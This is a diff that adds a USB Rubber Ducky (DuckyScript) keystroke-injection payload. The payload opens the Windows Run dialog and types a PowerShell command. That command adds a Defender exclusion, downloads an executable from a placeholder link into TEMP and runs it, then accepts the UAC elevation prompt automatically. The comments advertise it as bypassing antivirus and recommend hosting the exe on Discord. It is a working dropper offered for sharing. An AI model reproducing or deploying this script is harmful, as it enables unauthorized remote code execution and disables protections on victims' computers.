@@ -1,0 +1,23 @@
+REM Author: Quessts
+REM The following script downloads and runs
+REM executable files from the internet
+REM replace <File Name> with the name of the exe
+REM and replace <Download Link> with the URL link
+REM I recommend uploading the exe to discord and
+REM getting the URL from there. Also Make sure that
+REM the name of the exe doesn't exceed 5 characters
+REM this script also bypasses AntiVirus and
+REM adds the file to the exclusions list
+REM please give credit when sharing this script
+REM and don't use it for evil :)
+
+
+REM One second delay before start
+DELAY 1000
+GUI r
+DELAY 100
+STRING powershell Add-MpPreference -ExclusionPath "$env:TEMP\<File Name>.exe"; Invoke-WebRequest -Uri '<Download Link>' -OutFile $env:TEMP\<File Name>.exe; cd $env:TEMP; .\<File Name>.exe;
+CTRL-SHIFT ENTER
+DELAY 500
+ALT y
+
